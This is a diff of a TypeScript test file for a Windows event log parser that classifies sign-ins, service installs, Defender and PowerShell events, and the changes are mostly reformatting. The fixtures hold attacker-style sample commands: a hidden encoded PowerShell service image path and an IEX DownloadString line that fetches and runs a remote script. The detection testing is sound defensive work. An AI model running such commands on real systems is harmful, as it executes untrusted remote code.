@@ -204,9 +204,9 @@ describe("WindowsEventLogParser - sign-ins", () => {
   test.each([...NOISY_LOGON_TYPES, "0", ""])(
     "a successful logon of type %s - the machine at work - stays a log",
     (logonType: string) => {
-      expect(parse(collectorOtlpBody(successfulSignIn({ LogonType: logonType })))).toEqual(
-        [],
-      );
+      expect(
+        parse(collectorOtlpBody(successfulSignIn({ LogonType: logonType }))),
+      ).toEqual([]);
     },
   );
 
@@ -219,11 +219,14 @@ describe("WindowsEventLogParser - sign-ins", () => {
     "DWM-1",
     "UMFD-0",
     "-",
-  ])("a logon by %s, an account Windows runs as, stays a log", (user: string) => {
-    expect(
-      parse(collectorOtlpBody(successfulSignIn({ TargetUserName: user }))),
-    ).toEqual([]);
-  });
+  ])(
+    "a logon by %s, an account Windows runs as, stays a log",
+    (user: string) => {
+      expect(
+        parse(collectorOtlpBody(successfulSignIn({ TargetUserName: user }))),
+      ).toEqual([]);
+    },
+  );
 
   test.each(["127.0.0.1", "::1", "-", "0.0.0.0", ""])(
     "a sign-in from %s names no address",
@@ -238,14 +241,18 @@ describe("WindowsEventLogParser - sign-ins", () => {
   );
 
   test("an IPv6 address is kept", () => {
-    expect(viaCollector(failedSignIn({ IpAddress: "2001:db8::7" })).principalIp).toBe(
-      "2001:db8::7",
-    );
+    expect(
+      viaCollector(failedSignIn({ IpAddress: "2001:db8::7" })).principalIp,
+    ).toBe("2001:db8::7");
   });
 
-  test.each(Object.entries(WINDOWS_FAILURE_REASONS).filter(([code]) => {
-    return code.startsWith("0xc");
-  }))("a failure with status %s says why: %s", (code: string, reason: string) => {
+  test.each(
+    Object.entries(WINDOWS_FAILURE_REASONS).filter(
+      ([code]: [string, string]): boolean => {
+        return code.startsWith("0xc");
+      },
+    ),
+  )("a failure with status %s says why: %s", (code: string, reason: string) => {
     expect(
       viaCollector(failedSignIn({ SubStatus: code })).message.endsWith(
         `: ${reason}`,
@@ -513,21 +520,16 @@ describe("WindowsEventLogParser - services, tasks, policy and logs", () => {
 
   test("a service installed (System 7045) whose image is a command is read as one", () => {
     const event: NormalizedSecurityEvent = viaCollector(
-      windowsEvent(
-        7045,
-        WINDOWS_PROVIDERS.serviceControlManager,
-        "System",
+      windowsEvent(7045, WINDOWS_PROVIDERS.serviceControlManager, "System", [
+        ["ServiceName", "updater"],
         [
-          ["ServiceName", "updater"],
-          [
-            "ImagePath",
-            "%COMSPEC% /b /c start /b /min powershell -nop -w hidden -enc SQBFAFgA",
-          ],
-          ["ServiceType", "user mode service"],
-          ["StartType", "demand start"],
-          ["AccountName", "LocalSystem"],
+          "ImagePath",
+          "%COMSPEC% /b /c start /b /min powershell -nop -w hidden -enc SQBFAFgA",
         ],
-      ),
+        ["ServiceType", "user mode service"],
+        ["StartType", "demand start"],
+        ["AccountName", "LocalSystem"],
+      ]),
     );
 
     expect(event.activityName).toBe("Install");
@@ -550,11 +552,16 @@ describe("WindowsEventLogParser - services, tasks, policy and logs", () => {
     expect(
       parse(
         collectorOtlpBody(
-          windowsEvent(7040, WINDOWS_PROVIDERS.serviceControlManager, "System", [
-            ["param1", "Background Intelligent Transfer Service"],
-            ["param2", "demand start"],
-            ["param3", "auto start"],
-          ]),
+          windowsEvent(
+            7040,
+            WINDOWS_PROVIDERS.serviceControlManager,
+            "System",
+            [
+              ["param1", "Background Intelligent Transfer Service"],
+              ["param2", "demand start"],
+              ["param3", "auto start"],
+            ],
+          ),
         ),
       ),
     ).toEqual([]);
@@ -573,7 +580,10 @@ describe("WindowsEventLogParser - services, tasks, policy and logs", () => {
         windowsEvent(eventId, SECURITY, "Security", [
           ["SubjectUserName", "alice"],
           ["TaskName", "\\Microsoft\\Windows\\Updater"],
-          ["TaskContent", "<Task><Actions><Exec><Command>c:\\x.exe</Command></Exec></Actions></Task>"],
+          [
+            "TaskContent",
+            "<Task><Actions><Exec><Command>c:\\x.exe</Command></Exec></Actions></Task>",
+          ],
         ]),
       );
 
@@ -805,9 +815,12 @@ describe("WindowsEventLogParser - Sysmon", () => {
       expect(
         parse(
           collectorOtlpBody(
-            windowsEvent(eventId, SYSMON, "Microsoft-Windows-Sysmon/Operational", [
-              ["Image", "C:\\x\\a.exe"],
-            ]),
+            windowsEvent(
+              eventId,
+              SYSMON,
+              "Microsoft-Windows-Sysmon/Operational",
+              [["Image", "C:\\x\\a.exe"]],
+            ),
           ),
         ),
       ).toEqual([]);
@@ -883,22 +896,40 @@ describe("WindowsEventLogParser - Microsoft Defender", () => {
     [5001, "real-time protection turned off"],
     [5010, "scanning for spyware turned off"],
     [5012, "scanning for viruses turned off"],
-  ])("protection turned off (%s) is a High finding", (eventId: number, what: string) => {
-    const event: NormalizedSecurityEvent = viaCollector(
-      windowsEvent(eventId, DEFENDER, "Microsoft-Windows-Windows Defender/Operational", []),
-    );
+  ])(
+    "protection turned off (%s) is a High finding",
+    (eventId: number, what: string) => {
+      const event: NormalizedSecurityEvent = viaCollector(
+        windowsEvent(
+          eventId,
+          DEFENDER,
+          "Microsoft-Windows-Windows Defender/Operational",
+          [],
+        ),
+      );
 
-    expect(event.severityName).toBe("High");
-    expect(event.message).toBe(`Microsoft Defender ${what} on WIN-01.corp.example`);
-    expect(event.mitreTechniques).toEqual(["T1685"]);
-  });
+      expect(event.severityName).toBe("High");
+      expect(event.message).toBe(
+        `Microsoft Defender ${what} on WIN-01.corp.example`,
+      );
+      expect(event.mitreTechniques).toEqual(["T1685"]);
+    },
+  );
 
   test("its configuration changed (5007) is a Medium finding naming the change", () => {
     const event: NormalizedSecurityEvent = viaCollector(
-      windowsEvent(5007, DEFENDER, "Microsoft-Windows-Windows Defender/Operational", [
-        ["Old Value", ""],
-        ["New Value", "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Temp = 0x0"],
-      ]),
+      windowsEvent(
+        5007,
+        DEFENDER,
+        "Microsoft-Windows-Windows Defender/Operational",
+        [
+          ["Old Value", ""],
+          [
+            "New Value",
+            "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Temp = 0x0",
+          ],
+        ],
+      ),
     );
 
     expect(event.severityName).toBe("Medium");
@@ -907,18 +938,29 @@ describe("WindowsEventLogParser - Microsoft Defender", () => {
 
   test("attack surface reduction blocking (1121) is Medium; auditing (1122) Low", () => {
     const blocked: NormalizedSecurityEvent = viaCollector(
-      windowsEvent(1121, DEFENDER, "Microsoft-Windows-Windows Defender/Operational", [
-        ["Process Name", "C:\\Program Files\\Microsoft Office\\WINWORD.EXE"],
-        ["Path", "C:\\Users\\alice\\AppData\\Local\\Temp\\a.exe"],
-      ]),
+      windowsEvent(
+        1121,
+        DEFENDER,
+        "Microsoft-Windows-Windows Defender/Operational",
+        [
+          ["Process Name", "C:\\Program Files\\Microsoft Office\\WINWORD.EXE"],
+          ["Path", "C:\\Users\\alice\\AppData\\Local\\Temp\\a.exe"],
+        ],
+      ),
     );
     const audited: NormalizedSecurityEvent = viaCollector(
-      windowsEvent(1122, DEFENDER, "Microsoft-Windows-Windows Defender/Operational", [
-        ["Process Name", "C:\\x\\WINWORD.EXE"],
-      ]),
+      windowsEvent(
+        1122,
+        DEFENDER,
+        "Microsoft-Windows-Windows Defender/Operational",
+        [["Process Name", "C:\\x\\WINWORD.EXE"]],
+      ),
     );
 
-    expect([blocked.severityName, blocked.statusName]).toEqual(["Medium", "Blocked"]);
+    expect([blocked.severityName, blocked.statusName]).toEqual([
+      "Medium",
+      "Blocked",
+    ]);
     expect(blocked.message).toBe(
       "Microsoft Defender blocked WINWORD.EXE on WIN-01.corp.example: C:\\Users\\alice\\AppData\\Local\\Temp\\a.exe",
     );
@@ -929,13 +971,22 @@ describe("WindowsEventLogParser - Microsoft Defender", () => {
 describe("WindowsEventLogParser - PowerShell", () => {
   test("a script block PowerShell flagged as suspicious (a warning) is a Script Activity", () => {
     const event: NormalizedSecurityEvent = viaCollector(
-      windowsEvent(4104, WINDOWS_PROVIDERS.powerShell, "Microsoft-Windows-PowerShell/Operational", [
-        ["MessageNumber", "1"],
-        ["MessageTotal", "1"],
-        ["ScriptBlockText", "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/a.ps1')"],
-        ["ScriptBlockId", "{00000000-0000-0000-0000-000000000000}"],
-        ["Path", "C:\\Users\\alice\\run.ps1"],
-      ], { level: "Warning" }),
+      windowsEvent(
+        4104,
+        WINDOWS_PROVIDERS.powerShell,
+        "Microsoft-Windows-PowerShell/Operational",
+        [
+          ["MessageNumber", "1"],
+          ["MessageTotal", "1"],
+          [
+            "ScriptBlockText",
+            "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/a.ps1')",
+          ],
+          ["ScriptBlockId", "{00000000-0000-0000-0000-000000000000}"],
+          ["Path", "C:\\Users\\alice\\run.ps1"],
+        ],
+        { level: "Warning" },
+      ),
     );
 
     expect(event.className).toBe("Script Activity");
@@ -948,9 +999,13 @@ describe("WindowsEventLogParser - PowerShell", () => {
       expect(
         parse(
           collectorOtlpBody(
-            windowsEvent(4104, WINDOWS_PROVIDERS.powerShell, "Microsoft-Windows-PowerShell/Operational", [
-              ["ScriptBlockText", "Get-Date"],
-            ], { level }),
+            windowsEvent(
+              4104,
+              WINDOWS_PROVIDERS.powerShell,
+              "Microsoft-Windows-PowerShell/Operational",
+              [["ScriptBlockText", "Get-Date"]],
+              { level },
+            ),
           ),
         ),
       ).toEqual([]);
@@ -959,9 +1014,13 @@ describe("WindowsEventLogParser - PowerShell", () => {
 
   test("the XML's numeric level 3 is a warning too", () => {
     const xml: string = xmlBody(
-      windowsEvent(4104, WINDOWS_PROVIDERS.powerShell, "Microsoft-Windows-PowerShell/Operational", [
-        ["ScriptBlockText", "IEX"],
-      ], { level: "Warning" }),
+      windowsEvent(
+        4104,
+        WINDOWS_PROVIDERS.powerShell,
+        "Microsoft-Windows-PowerShell/Operational",
+        [["ScriptBlockText", "IEX"]],
+        { level: "Warning" },
+      ),
     );
 
     expect(parse(xml)).toHaveLength(1);
@@ -982,7 +1041,9 @@ describe("WindowsEventLogParser - what stays a log", () => {
     expect(
       parse(
         collectorOtlpBody(
-          windowsEvent(eventId, provider, "Security", [["TargetUserName", "alice"]]),
+          windowsEvent(eventId, provider, "Security", [
+            ["TargetUserName", "alice"],
+          ]),
         ),
       ),
     ).toEqual([]);
@@ -1021,10 +1082,16 @@ detection:
 `);
 
     expect(
-      sigmaRuleMatchesEvent(sigma, viaCollector(failedSignIn({ LogonType: "10" }))),
+      sigmaRuleMatchesEvent(
+        sigma,
+        viaCollector(failedSignIn({ LogonType: "10" })),
+      ),
     ).toBe(true);
     expect(
-      sigmaRuleMatchesEvent(sigma, viaCollector(failedSignIn({ LogonType: "3" }))),
+      sigmaRuleMatchesEvent(
+        sigma,
+        viaCollector(failedSignIn({ LogonType: "3" })),
+      ),
     ).toBe(false);
   });
 
@@ -1038,7 +1105,9 @@ detection:
   condition: selection
 `);
 
-    expect(sigmaRuleMatchesEvent(sigma, viaCollector(processCreated()))).toBe(true);
+    expect(sigmaRuleMatchesEvent(sigma, viaCollector(processCreated()))).toBe(
+      true,
+    );
   });
 
   function libraryRule(title: string): SigmaRule {
@@ -1094,12 +1163,17 @@ describe("WindowsEventLogParser - the prefilter", () => {
     ["4688", processCreated()],
     [
       "4732",
-      windowsEvent(4732, SECURITY, "Security", [["TargetUserName", "Administrators"]]),
+      windowsEvent(4732, SECURITY, "Security", [
+        ["TargetUserName", "Administrators"],
+      ]),
     ],
     [
       "1102",
       windowsEvent(1102, WINDOWS_PROVIDERS.eventLog, "Security", [], {
-        userData: { name: "LogFileCleared", fields: [["SubjectUserName", "a"]] },
+        userData: {
+          name: "LogFileCleared",
+          fields: [["SubjectUserName", "a"]],
+        },
       }),
     ],
     [
@@ -1116,18 +1190,29 @@ describe("WindowsEventLogParser - the prefilter", () => {
     ],
     [
       "Defender 1116",
-      windowsEvent(1116, DEFENDER, "Microsoft-Windows-Windows Defender/Operational", []),
+      windowsEvent(
+        1116,
+        DEFENDER,
+        "Microsoft-Windows-Windows Defender/Operational",
+        [],
+      ),
     ],
     [
       "PowerShell 4104",
-      windowsEvent(4104, WINDOWS_PROVIDERS.powerShell, "Microsoft-Windows-PowerShell/Operational", [
-        ["ScriptBlockText", "IEX"],
-      ], { level: "Warning" }),
+      windowsEvent(
+        4104,
+        WINDOWS_PROVIDERS.powerShell,
+        "Microsoft-Windows-PowerShell/Operational",
+        [["ScriptBlockText", "IEX"]],
+        { level: "Warning" },
+      ),
     ],
   ];
 
   const CASES: Array<[string, string, string]> = KEPT.flatMap(
-    ([name, spec]: [string, WindowsEventSpec]): Array<[string, string, string]> => {
+    ([name, spec]: [string, WindowsEventSpec]): Array<
+      [string, string, string]
+    > => {
       return NAMED_SHAPES.map(
         ([shape, render]: [WindowsShape, (spec: WindowsEventSpec) => string]): [
           string,
@@ -1156,7 +1241,11 @@ describe("WindowsEventLogParser - the prefilter", () => {
           string,
           string,
         ] => {
-          return [logonType, shape, render(successfulSignIn({ LogonType: logonType }))];
+          return [
+            logonType,
+            shape,
+            render(successfulSignIn({ LogonType: logonType })),
+          ];
         },
       );
     },
@@ -1182,7 +1271,11 @@ describe("WindowsEventLogParser - the prefilter", () => {
     expect(WINDOWS_PREFILTER_GROUPS[1]!.anyOf).toEqual(["4624"]);
 
     for (const group of WINDOWS_PREFILTER_GROUPS) {
-      for (const word of [group.requires, ...group.anyOf, ...(group.noneOf || [])]) {
+      for (const word of [
+        group.requires,
+        ...group.anyOf,
+        ...(group.noneOf || []),
+      ]) {
         expect(word).toBe(word.toLowerCase());
       }
     }
@@ -1193,11 +1286,16 @@ describe("WindowsEventLogParser - the prefilter", () => {
       expect(marker.includes("3")).toBe(true);
     }
 
-    const rdp: string = collectorOtlpBody(successfulSignIn({ LogonType: "10" }));
+    const rdp: string = collectorOtlpBody(
+      successfulSignIn({ LogonType: "10" }),
+    );
 
     for (const logonType of NOISY_LOGON_TYPES) {
       for (const marker of logonTypeMarkers(logonType)) {
-        expect({ marker, inRdpLine: rdp.toLowerCase().includes(marker) }).toEqual({
+        expect({
+          marker,
+          inRdpLine: rdp.toLowerCase().includes(marker),
+        }).toEqual({
           marker,
           inRdpLine: false,
         });
@@ -1244,9 +1342,12 @@ describe("WindowsEventLogParser - long lines", () => {
           4625,
           SECURITY,
           "Security",
-          Array.from({ length: 5000 }, (_value: unknown, index: number): [string, string] => {
-            return [`F${index}`, "v"];
-          }),
+          Array.from(
+            { length: 5000 },
+            (_value: unknown, index: number): [string, string] => {
+              return [`F${index}`, "v"];
+            },
+          ),
         ),
       ),
     ],
